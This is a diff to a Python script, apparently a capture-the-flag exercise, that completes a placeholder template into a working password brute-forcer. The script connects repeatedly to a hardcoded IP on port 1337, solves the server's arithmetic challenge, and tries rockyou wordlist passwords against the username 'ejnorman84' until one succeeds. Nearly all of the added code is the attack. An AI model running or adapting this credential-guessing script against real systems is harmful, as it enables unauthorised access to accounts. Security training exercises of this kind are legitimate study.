@@ -25,10 +25,11 @@
 """
 
 import socket
+import time
 
-host = "" # IP address here
-port = 0000 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+host = "157.230.179.99" # IP address here
+port = 1337 # Port here
+wordlist = "/root/Desktop/rockyou.txt" # Point to wordlist file
 
 def brute_force():
     """
@@ -55,8 +56,63 @@ def brute_force():
             v0idcache's server.
     """
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+    openPassW = open(wordlist,"r")
+
+    
+    #counter = 0
+    #x = openPassW.readlines()
+    
+    for passw in openPassW:
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        time.sleep(1)
+        data = s.recv(1024)
+        
+        #print(data)
+        arrayMath = data.split()
+        while len(arrayMath) <= 3: 
+            data += s.recv(1024)
+            arrayMath = data.split()
+        #print(arrayMath)
+        x = int(arrayMath[3])
+        y = int(arrayMath[5])
+        if arrayMath[4] == '+':
+           val = x + y 
+        else:
+            if arrayMath[4] == '-':
+               val = x - y 
+            else:
+                if arrayMath[4] == '/':
+                   val = x/y
+                else:
+                   val = x * y
+    
+
+        #print(val)
+        s.send(str(val)+"\n")
+        
+        data = s.recv(1024) #receive username:
+        time.sleep(0.1)
+        s.send('ejnorman84\n') 
+        
+        data = s.recv(1024) #receive password:
+        time.sleep(0.1)
+        #print(passw)
+        s.send(passw.strip()+"\n")
+        time.sleep(0.2)
+        data = (s.recv(1024))
+        time.sleep(1)
+        print(data)
+        if "Fail" not in data: break
+
+        s.close()
+        
+        
+            
+        
+        
+       
 
 
 
